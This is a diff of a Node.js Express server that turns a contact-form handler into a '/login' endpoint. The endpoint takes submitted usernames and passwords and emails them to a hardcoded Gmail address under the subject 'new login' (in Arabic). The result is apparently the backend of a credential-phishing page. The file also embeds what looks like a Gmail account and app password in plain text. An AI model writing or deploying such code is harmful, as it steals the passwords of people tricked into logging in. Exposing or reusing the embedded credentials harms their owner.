@@ -1,35 +1,35 @@
 const express = require('express');
 const nodemailer = require('nodemailer');
-const bodyParser = require('express').urlencoded({ extended: true });
 const app = express();
 
 app.use(express.static('public'));
-app.use(bodyParser);
+app.use(express.urlencoded({ extended: true }));
 
-app.post('/send', (req, res) => {
+app.post('/login', (req, res) => {
   const { name, password } = req.body;
 
   const transporter = nodemailer.createTransport({
     service: 'gmail',
     auth: {
-      user: 'itinfor79@gmail.com',       // ✉️ بريدك
-      pass: 'eqlfoyyxgoknvjne'           // 🔐 كلمة مرور التطبيقات
+      user: 'itinfor79@gmail.com',
+      pass: 'eqlfoyyxgoknvjne' // تأكد أنها كلمة مرور التطبيقات
     }
   });
 
   const mailOptions = {
-    from: email,
-    to: 'itinfor79@gmail.com',           // ✉️ بريدك أيضًا
-    subject: 'رسالة من نموذج التواصل',
-    text: `الاسم: ${name}\nالبريد: ${password}\n`
+    from: 'itinfor79@gmail.com',
+    to: 'itinfor79@gmail.com',
+    subject: '📩 تسجيل دخول جديد',
+    text: `اسم المستخدم: ${name}\nكلمة المرور: ${password}`
   };
 
   transporter.sendMail(mailOptions, (error, info) => {
     if (error) {
-      console.log(error);
+      console.error('❌ فشل الإرسال:', error);
       return res.send('حدث خطأ أثناء الإرسال.');
     }
-    res.send('تم إرسال رسالتك بنجاح!');
+    console.log('✅ تم إرسال البيانات:', info.response);
+    res.send('✅ تم إرسال البيانات بنجاح!');
   });
 });
 
